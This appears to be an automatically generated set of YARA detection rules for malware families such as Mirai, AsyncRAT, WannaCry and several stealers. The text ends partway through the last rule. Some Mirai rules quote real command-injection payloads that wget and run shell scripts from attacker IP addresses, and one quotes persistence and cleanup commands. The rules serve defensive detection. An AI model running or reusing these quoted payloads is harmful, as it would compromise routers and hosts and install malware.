rule Sightlines_tlsh_30940f2d_salatstealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-30940f2d"
        date = "2026-10-24"
        campaign = "tlsh-30940f2d"
        family = "salatstealer"
        hash = "02fa9c7b88f443b451e7f03bdb723558cc8db7c35eee130e3fd17429813b00c4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-30940f2d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "GBZAP-PACK-UNIQUE" ascii
        $s1 = "KbpxF9v|1<`J~|" ascii
        $s2 = "{}z4:RHGd,X,NB" ascii
        $s3 = "'i]m&yNefvj}" ascii
        $s4 = "BzawNgE[Q|K`" ascii
        $s5 = "Gz4!d|#D<Ogb" ascii
        $s6 = "im|5?2K0l}\\4" ascii
        $s7 = "F:[`qIQAC>tQ" ascii
        $s8 = "Cneq^6!+KezX" ascii
        $s9 = "!amb)&zg-s3" ascii
        $s10 = "=:0<,8OADcK" ascii
        $s11 = "MI{O*qR%!h5" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 7186080 and 12 of them
}

rule Sightlines_imphash_4dcabbb4_tofsee
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-4dcabbb4"
        date = "2026-10-24"
        campaign = "imphash-4dcabbb4"
        family = "tofsee"
        hash = "1d38d8bfd45a9e930fe52b85eac56e05271d712cd6ba4096c7c57d0ce99350cc"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-4dcabbb4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>" ascii
        $s2 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s3 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s4 = "Embarcadero Delphi for Win32 compiler version 36.0 (29.0.55362.2017)" ascii
        $s5 = "        <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" ascii
        $s6 = "        <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>" ascii
        $s7 = "        <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" ascii
        $s8 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s9 = "VTEnumerable<System.Generics.Collections.TPair<System.TypInfo.PTypeInfo,System.string>>'" ascii
        $s10 = "VTEnumerable<System.Generics.Collections.TPair<System.string,System.TypInfo.PTypeInfo>>'" ascii
        $s11 = "        <supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"/>" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 34271828 and 11 of them
}

rule Sightlines_imphash_cd8a4a6f_coinminer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-cd8a4a6f"
        date = "2026-10-24"
        campaign = "imphash-cd8a4a6f"
        family = "coinminer"
        hash = "0f73cd5b76af3ee8d3f00e30bfadb36290b390e028687525b586e6cb721e561d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-cd8a4a6f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "7`=t 1#/% 4\"o7TTxcpLe8yPpDxgh67xXSBWJnVu9bW8t7GU:YG_t" ascii
        $s1 = "xmlns=\"urn:schemas-microsoft-com:asm.v3\"><windowsSettings><dpiAware xmlns=\"http://schemas.microsoft." ascii
        $s2 = "com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" ascii
        $s3 = "as-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" u" ascii
        $s4 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schem" ascii
        $s5 = "iAccess=\"false\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><application " ascii
        $s6 = "E:\\CryptoNight\\bitmonero-master\\src\\miner\\Release\\Crypto.pdb" ascii
        $s7 = "$trogzam kannot bi run in DOS mode$-" ascii
        $s8 = "rulocati_n(0rmtocol v5Rs)ol($`" ascii
        $s9 = "3034383<3@3D3H3L3P3T3X3\\3`3d3h3l3p3t3x3|3" ascii
        $s10 = "6064686<6@6D6H6L6P6T6X6\\6`6d6h6l6p6t6x6|6" ascii
        $s11 = "8 8$8(8,80888<8@8D8H8L8P8T8X8\\8`8d8h8l8p8t8x8|8" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3156992 and 11 of them
}

rule Sightlines_tlsh_19d3cf5d_connectwise
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-19d3cf5d"
        date = "2026-10-15"
        campaign = "tlsh-19d3cf5d"
        family = "connectwise"
        hash = "27b75ce758c4a59c60916cde187b814755059d3fddb982d02d397dffd9eb101e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-19d3cf5d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "FJ7ZuWXP5BWViHJTbf5tPj7Sz3VZwFq8m7qZRUuRH8DdT5ZTh16EXQCtQGTdC3%2f6cdeRipg90LvRJZX4%2fUH8mHIc8WT2uHwG" ascii
        $s1 = "owrzdSYAy9REZQ6VQse0UfvmLhINz31AqKPMMoMth4o%2bMavAJ8l%2b4%2b2cAnDO%2bb6%2bFylxuzA&t=&c=&c=&c=&c=&c=&" ascii
        $s2 = "inalUrlEncoding#1regED314AE69CE5D835D523FB365C82C36B[URL_SCHEME]\\shell\\open\\command\"[INSTALLLOCATION" ascii
        $s3 = "0TTG%2bw8jNKIhaiX5%2bAk5V%2fBlG7ZV8vvpvIpen%2bIjWKto%2b%2ft2RaJJkmNEiZXVhbDKkMCgLoguOOEHQTD2zzeE%2b%" ascii
        $s4 = "2bYbIKt2%2btII8jVJd9udccUDkoBTNIilMA4lD%2f18HSK9IXWik3cby%2bIBrxpoP6s%2bA2rbet3WdvT0np%2bdqRuOkf2A8i" ascii
        $s5 = "24?69<>BRTVDFIHLOQX[bhj]_adfnm|{qptvxz~" wide
        $s6 = "{7350F8A0-CE89-45E4-99C4-3D3D88E5E885}NOT SERVICE_ARGUMENTSServiceExeWithoutServiceScrubFiles_Initia" ascii
        $s7 = "IRyesARPNOMODIFYALLUSERS1ManufacturerScreenConnect SoftwareProductCode{B292C5EA-BF5F-428" ascii
        $s8 = "emote Control\"[SERVICE_ARGUMENTS]\"{0C94448B-0C9E-4112-AC7D-B00E6BA76D82}0.0.0.099.0.0.0OLD_PRODUCT_1" ascii
        $s9 = "tallSOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Client[MachineName]Users[SERVICE_NAME]restartnoneR" ascii
        $s10 = "reateProgramDataDirectory{4768BE46-975A-455C-AF15-61A15FE629A4}PROGRAMDATALOCATIONMainFiles{E0EF5F66" ascii
        $s11 = "ntrol\\SafeBoot\\Network\\[SERVICE_NAME]ServiceSoftware\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727Ins" ascii
    condition:
        filesize < 3137536 and 12 of them
}

rule Sightlines_c2_f1f6fa03_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-f1f6fa03"
        date = "2026-10-24"
        campaign = "c2-f1f6fa03"
        family = "mirai"
        hash = "0e67f85a45a9dfa874c2b1925415d984682ccd2ba2e6fbd51f2bb6b457d7eec7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-f1f6fa03.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ce:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -q -O /tmp/huawei 'http://176.65.139.157/te" ascii
        $s1 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-ins" ascii
        $s2 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://176.65.139.157/wawan2" ascii
        $s3 = "lnet2.sh'; sh /tmp/huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgr" ascii
        $s4 = "GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://176.65.139.157/telnet2" ascii
        $s5 = "GET /cgi-bin/;cd${IFS}/var/tmp;rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://176.65.139.157/telnet2.sh;$" ascii
        $s6 = "OAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><u:SetNTPServers xm" ascii
        $s7 = "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://176.65.139.157/telnet2.sh;sh+/tmp/vacron" ascii
        $s8 = "e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=" ascii
        $s9 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://176.65.139.157/wawan2.sh+-" ascii
        $s10 = "uration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://176.65.139.157/telnet2.s" ascii
        $s11 = "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://176.65.139.157/telnet2.sh;sh+/tmp/awsec2" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1399932 and 3 of them
}

rule Sightlines_tlsh_09220cf5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-09220cf5"
        date = "2026-10-24"
        campaign = "tlsh-09220cf5"
        family = ""
        hash = "08127248cd695390b8e7f64bafcf4d2dc78f5d489186f8a810426b92e2dc4f0c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-09220cf5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s1 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s2 = "((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0" ascii
        $s3 = "info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela))" ascii
        $s4 = "http://mkhkjxgchtfgu7uhofxzgoawntfzrkdccymveektqgpxrpjb72oq.b32.i2p/cgi-bin/prometei.cgi" ascii
        $s5 = "%s: Symbol `%s' causes overflow in R_X86_64_PC32 relocation" ascii
        $s6 = "_dl_debug_initialize (0, args.nsid)->r_state == RT_CONSISTENT" ascii
        $s7 = "_dl_debug_initialize (0, args->nsid)->r_state == RT_CONSISTENT" ascii
        $s8 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s9 = "ELFW(R_TYPE) (reloc->r_info) == R_X86_64_RELATIVE" ascii
        $s10 = "conf->nameserver_list[i]->sa_family == AF_INET6" ascii
        $s11 = "lead_zero <= (base == 16 ? (uintmax_t) INTMAX_MAX / 4 : (uintmax_t) INTMAX_MAX)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2577750 and 12 of them
}

rule Sightlines_tlsh_a2f6ef18_amos
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a2f6ef18"
        date = "2026-10-24"
        campaign = "tlsh-a2f6ef18"
        family = "amos"
        hash = "06a3833ccb61fe1dea39f628f1425524fd865c05a850aaf12da84bca23713292"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a2f6ef18.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation" ascii
        $s1 = "/usr/lib/libSystem.B.dylib" ascii
        $s2 = "/usr/lib/libc++.1.dylib" ascii
        $s3 = "@___cxa_guard_acquire" ascii
        $s4 = "@___cxa_guard_release" ascii
        $s5 = "@___stack_chk_guard" ascii
        $s6 = "@dyld_stub_binder" ascii
        $s7 = "@_mach_task_self_" ascii
        $s8 = "@___stack_chk_fail" ascii
        $s9 = "@_pthread_once" ascii
        $s10 = "__la_symbol_ptr" ascii
        $s11 = "__mod_init_func" ascii
    condition:
        filesize < 4729344 and 10 of them
}

rule Sightlines_tlsh_f4224959_rustystealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f4224959"
        date = "2026-10-24"
        campaign = "tlsh-f4224959"
        family = "rustystealer"
        hash = "033a8b8348f130381e6eaa842e7710a5abd2b64fb1b367a42566645e7abcff55"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f4224959.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "assertion failed: min_bits >= MIN_BITS/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/rin" ascii
        $s1 = "called `Result::unwrap()` on an `Err` value/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557" ascii
        $s2 = "SizeLimitExhaustedParseIntErrorkindInvalidDigitPosOverflowNegOverflowZeroNotAPowerOfTwo/rustc/b94008" ascii
        $s3 = "assertion failed: len >= size_of::<c::sockaddr_in>()/rustc/b940084d7eb6a299eb4bfeb8e34901bc051e7ac4/" ascii
        $s4 = "Cunsafe extern \"\" -fn( ->  + : punycode{}.llvm./rust/deps\\rustc-demangle-0.1.28\\src\\lib.rs" ascii
        $s5 = "Punycode overflows should not be possible due to PUNYCODE_ENCODE_MAX_INPUT_LENGTH" ascii
        $s6 = "assertion failed: value <= self.max_value()/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557" ascii
        $s7 = "CHUNK_SIZE_MAX_BYTES should fit any usize" ascii
        $s8 = "CertificateCompressionAlgorithmsecp256r1secp384r1secp521r1X25519X448CertificateTypeNamedGroupFFDHE20" ascii
        $s9 = "Proxy-Authorization: /root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/hyper-util-0.1.21/sr" ascii
        $s10 = "sample of invalid length/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/rustls-0.23.45/sr" ascii
        $s11 = "too many active read locks on RwLock/rustc/b940084d7eb6a299eb4bfeb8e34901bc051e7ac4/library\\std\\src\\" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4484096 and 3 of them
}

rule Sightlines_tlsh_0555ba78_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-0555ba78"
        date = "2026-10-24"
        campaign = "tlsh-0555ba78"
        family = ""
        hash = "0a6fba5cb7df14a18cf3d65bdb02cd0494b67c6221da5085c19295d946b8e826"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-0555ba78.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ShortcutDirectory_TargetHotkeyIcon_IconIndexShowCmdWkDirDisplayResourceDLLDisplayResourceIdDescripti" ascii
        $s1 = "MediaDiskIdLastSequenceDiskPromptCabinetVolumeLabelSource#cab1.cabAdminUISequenceActionConditionSequ" ascii
        $s2 = "SearchPropertySignature_UpgradeUpgradeCodeVersionMinVersionMaxLanguageAttributesRemoveActionProperty" ascii
        $s3 = "ypeStartTypeErrorControlLoadOrderGroupDependenciesStartNamePasswordArgumentsComponent_DescriptionApp" ascii
        $s4 = "enceCostInitializeFileCostCostFinalizeExecuteActionErrorMessageServiceInstallNameDisplayNameServiceT" ascii
        $s5 = "onResourceDLLDescriptionResourceIdInstallExecuteSequenceValidateProductIDInstallValidateInstallIniti" ascii
        $s6 = "alizeProcessComponentsUnpublishFeaturesRemoveRegistryValuesWriteRegistryValuesRegisterUserRegisterPr" ascii
        $s7 = "Installation Database" ascii
        $s8 = " !#+7DMNPUYadg{}" wide
        $s9 = "SummaryInformation" wide
        $s10 = "+,-./012345678" wide
        $s11 = "cdefghijklmnop" wide
    condition:
        filesize < 5851136 and 9 of them
}

rule Sightlines_tlsh_c62a452d_amos
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c62a452d"
        date = "2026-10-24"
        campaign = "tlsh-c62a452d"
        family = "amos"
        hash = "0c26434c9da255d1f717caa0e042f9b2c3b1088cc44892e3703edfb609b27b41"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c62a452d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation" ascii
        $s1 = "/usr/lib/libSystem.B.dylib" ascii
        $s2 = "/usr/lib/libc++.1.dylib" ascii
        $s3 = "@___cxa_guard_acquire" ascii
        $s4 = "@___cxa_guard_release" ascii
        $s5 = "@___stack_chk_guard" ascii
        $s6 = "@dyld_stub_binder" ascii
        $s7 = "@_mach_task_self_" ascii
        $s8 = "@___stack_chk_fail" ascii
        $s9 = "@_pthread_once" ascii
        $s10 = "__la_symbol_ptr" ascii
        $s11 = "__mod_init_func" ascii
    condition:
        filesize < 4796608 and 10 of them
}

rule Sightlines_tlsh_1d67764a_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1d67764a"
        date = "2026-10-23"
        campaign = "tlsh-1d67764a"
        family = "mirai"
        hash = "01c97268134bd3bcb04f32567f2c8b5fa2aafab4f268e7ce70ae3731566133bf"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1d67764a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s1 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s2 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
        $s3 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s4 = "((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0" ascii
        $s5 = "info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela))" ascii
        $s6 = "WARNING: ld.so: invalid GLIBC_TUNABLES `%s': ignored." ascii
        $s7 = "info[DT_RELRENT]->d_un.d_val == sizeof (ElfW(Relr))" ascii
        $s8 = "%s: Symbol `%s' causes overflow in R_X86_64_PC32 relocation" ascii
        $s9 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s10 = "ELFW(R_TYPE) (reloc->r_info) == R_X86_64_RELATIVE" ascii
        $s11 = "(char *) chunk2mem (p) + 2 * CHUNK_HDR_SZ <= paligned_mem" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2536224 and 11 of them
}

rule Sightlines_tlsh_6a6c4c45_asyncrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6a6c4c45"
        date = "2026-10-24"
        campaign = "tlsh-6a6c4c45"
        family = "asyncrat"
        hash = "0b19b12b0919cf3bb6904355593948a5077f23f81aca05ffebf60f81eb860ea2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6a6c4c45.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ").NETFramework,Version=v4.0,Profile=Client" ascii
        $s1 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s2 = "Invalid message authentication code (MAC)." wide
        $s3 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" />" ascii
        $s4 = "\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS" wide
        $s5 = "1DB2A1F9902B35F8F880EF1692CE9947A193D5A698D8F568BDA721658ED4C58B" ascii
        $s6 = "87639126EA77B358F26532367DBA67C5310EF50A8D9888ED070CD40E1F605A8F" ascii
        $s7 = "Select * from Win32_ComputerSystem" wide
        $s8 = "masterKey can not be null or empty." wide
        $s9 = "(ext8,ext16,ex32) type $c7,$c8,$c9" wide
        $s10 = ".NET Framework 4 Client Profile" ascii
        $s11 = "Select * from AntivirusProduct" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 10 of them
}

rule Sightlines_tlsh_90af4443_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-90af4443"
        date = "2026-10-24"
        campaign = "tlsh-90af4443"
        family = "mirai"
        hash = "0c0295c4b0b1f4d92b0d36bf2f5d8107ff21fb8c13fd0bc84c108462eaa95579"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-90af4443.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s1 = "Accept-Encoding: gzip, deflate" ascii
        $s2 = "/etc/config/resolv.conf" ascii
        $s3 = "Unknown error Success" ascii
        $s4 = "/etc/config/hosts" ascii
        $s5 = "/proc/%d/stat" ascii
        $s6 = "/proc/%d/exe" ascii
        $s7 = "D @N^NuNV" ascii
        $s8 = "L @N^NuNV" ascii
        $s9 = "j @N^NuNV" ascii
        $s10 = " @N^NuNuNV" ascii
        $s11 = "$_N^NuNuNV" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_host_b487924f_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-b487924f"
        date = "2026-10-23"
        campaign = "host-b487924f"
        family = "mirai"
        hash = "13a4f1bb7f3db7a90412ba7badf1edf7aec3574897d5aaafd1b18d4d375ed144"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-b487924f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/var/tmp/%s\\nRestart=on-failure\\nRestartSec=30\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/syst" ascii
        $s1 = "printf '[Unit]\\nDescription=System Service\\nAfter=network.target\\n[Service]\\nType=simple\\nExecStart=" ascii
        $s2 = "echo '0' > /proc/sys/kernel/pid_max 2>/dev/null" ascii
        $s3 = "crontab -l 2>/dev/null | grep -v '%s' | crontab - 2>/dev/null" ascii
        $s4 = "find /tmp /var/tmp /dev/shm /root -name '*%s*' -delete 2>/dev/null" ascii
        $s5 = "chmod +x /var/tmp/%s /usr/lib/%s 2>/dev/null" ascii
        $s6 = "systemctl daemon-reload 2>/dev/null; systemctl enable %s 2>/dev/null" ascii
        $s7 = "rm -f /lib/systemd/system/%s.service 2>/dev/null" ascii
        $s8 = "systemctl stop %s 2>/dev/null; systemctl disable %s 2>/dev/null" ascii
        $s9 = "sed -i '/%s/d' /etc/rc.local 2>/dev/null" ascii
        $s10 = "rm -f /etc/systemd/system/%s.service 2>/dev/null" ascii
        $s11 = "chattr +i /var/tmp/%s 2>/dev/null" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 5440528 and 12 of them
}

rule Sightlines_imphash_81dbdf66_wannacry
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-81dbdf66"
        date = "2026-10-24"
        campaign = "imphash-81dbdf66"
        family = "wannacry"
        hash = "087652837c60f07a352de8b64b7df182799ca236b89b98dc3c5c418cbe9ae6b8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-81dbdf66.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "C4OSmdKQrtN4zZnAShPGa3yLpqS3VvaD+W5IRkA9dhgJi1NlYPDhKQB2pr7GgprbLruE8xtGkqWGFtDoqzIXeXU3XV6NOsK7TlcH" ascii
        $s1 = "5DFOtJPRVbIPl8QOjm2IE1rwQt4AbVR2o6YK5pUGXNLCZxXroI8l+mQX3gudA56Bcb/I7hfyeWZy5zaWa5BRrI1Ss+7D3v9knvDj" ascii
        $s2 = "vLg7Z1Yr/AZ9TmVxAspk7OakT4SmzfidGCQHPD6qoQ41LMIIyKFqGsWQuDEw4x/9j8jbUm+8ebrYp2a8XGY1h3pcYKAJ7f3a9sPB" ascii
        $s3 = "hiYO7Q+UFFfP/bcJ4FTPy5qnpEnX6v+n88x+C1TSRKCzHZ9osGZF3WtNaDyBIirDNBcOtpV0TcMLaoZiSGg7YW1BrYdfwMKBsYuK" ascii
        $s4 = "7gHFD958N9Ikb/zj66YdRI/SIUt3c+fEPxFLLmSmOGQ8Rbpl1ytuv02fEoG4PhU8kVJ5BUKldbtJG23VlkEmWTKy+q2y1/e7injM" ascii
        $s5 = "H7HLnklZH1DscvSX0oEzLb9ao0qjflfyRGeFEnFbJrG/m/FawTW35AVy4Dzyj+eJQPeQjNUDpmYCF7lQg8Ogvik53rxqvui98Dhv" ascii
        $s6 = "7cnWqoHGHRhLihPuuXPs2N/CNUMOSGRjVyfio3Du9RtCB7FcJDdvvFHa343mSJsMQpYYNa+Tr+egbyulIVECrZUydjVmaPzw2sWi" ascii
        $s7 = "neprH8ycAIb64J3C5ZI0yFkLDbN2U+BkPA8otv1dADGEqxI1TtkOY/LcyNddDhyAW9gm4qf3MQyzclmKXbk8uEb3ZKFRmhGAUi+S" ascii
        $s8 = "DyMT7fZb9dEiBVHAXy2yWY9zFfWRngNlQqmfprJozjU4Swj1cOZm2o5ZsNR2I3Jz18uMEn/KJa3uiQuYeJnAafHVKLBstAgGITZS" ascii
        $s9 = "Fyf5GGvog1W2q80GVhaMfKbhFwpqCcgsDGcIISyPz1QXWJktidU9PN7yBFHUElW2kZFuk4LhQndbvNFK7Raj1sTQiOHy+Ke4/K1M" ascii
        $s10 = "937EHPiU2WTFl2sg/jZr95EkGp3mmUP8NAo68Fwi8C/4n+ycc0d2o7OyH76a75h9ofch0u50bz9pOnQVSN/KwyJtkqMNUKf8XaYv" ascii
        $s11 = "EClrZY+rdrFD5KQbp0qhYwgEls4ay1j31a+xkRP6TTMx8VvXUutIg1Gmd7i+sXAS6mY98lKee9NvMpJE7OavgZJbxo/kqwdZ5Tj1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 10596352 and 12 of them
}

rule Sightlines_imphash_6f900601_coinminer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-6f900601"
        date = "2026-10-24"
        campaign = "imphash-6f900601"
        family = "coinminer"
        hash = "10ec67de1ae7d0c14ba166e803b1eaf11b81d19baa8f41981bf664f2194b226a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-6f900601.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " inflate 1.2.8 Copyright 1995-2013 Mark Adler " ascii
        $s1 = "Failed to convert pyhome to ANSI (invalid multibyte string)" ascii
        $s2 = "Failed to get address for PyMarshal_ReadObjectFromString" ascii
        $s3 = "Failed to convert pypath to ANSI (invalid multibyte string)" ascii
        $s4 = "PyInstaller: pyi_win32_utils_to_utf8 failed." ascii
        $s5 = "WARNING: file already exists but should not: %s" ascii
        $s6 = "Cannot allocate memory for ARCHIVE_STATUS" ascii
        $s7 = "Failed to convert Wflag %s using mbstowcs (invalid multibyte string)" ascii
        $s8 = "Failed to get address for PyObject_CallFunction" ascii
        $s9 = "Failed to get address for Py_FileSystemDefaultEncoding" ascii
        $s10 = "Failed to get address for PyImport_ExecCodeModule" ascii
        $s11 = "Failed to get address for PyRun_SimpleString" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 12542518 and 12 of them
}

rule Sightlines_imphash_b5a9528d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-b5a9528d"
        date = "2026-10-20"
        campaign = "imphash-b5a9528d"
        family = ""
        hash = "2232a4de805aa5cdc72ab2fa3e491a6b4f229809b53eac5f79e3ccb1f4c8b60f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-b5a9528d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "command line encoding conversion failure" ascii
        $s1 = "Windows original main args:" ascii
        $s2 = "OpenJDK Platform binary" wide
        $s3 = "http://www.eclipse.org/0" ascii
        $s4 = "JLI_InitArgProcessing" ascii
        $s5 = "_JAVA_LAUNCHER_DEBUG" ascii
        $s6 = "Eclipse Adoptium" wide
        $s7 = "JLI_GetStdArgc" ascii
        $s8 = "JLI_GetStdArgs" ascii
        $s9 = "380114235959Z0i1" ascii
        $s10 = "JLI_CmdToArgs" ascii
        $s11 = "360903235959Z0c1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_c2_d5dc8ccd_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-d5dc8ccd"
        date = "2026-10-24"
        campaign = "c2-d5dc8ccd"
        family = "mirai"
        hash = "1826b5c073569dba6d64db1bcd72c5777144e85464a30c72417ce19ece8103a2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-d5dc8ccd.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "action_mode=SETROOTCERTIFICATE&cert_fname=cert.pem&cert_data=\";cd /tmp;wget http://176.65.139.196/bi" ascii
        $s1 = "cd /tmp; wget http://176.65.139.196/bins/kla.sh -O k 2>/dev/null; chmod +x k 2>/dev/null; ./k" ascii
        $s2 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
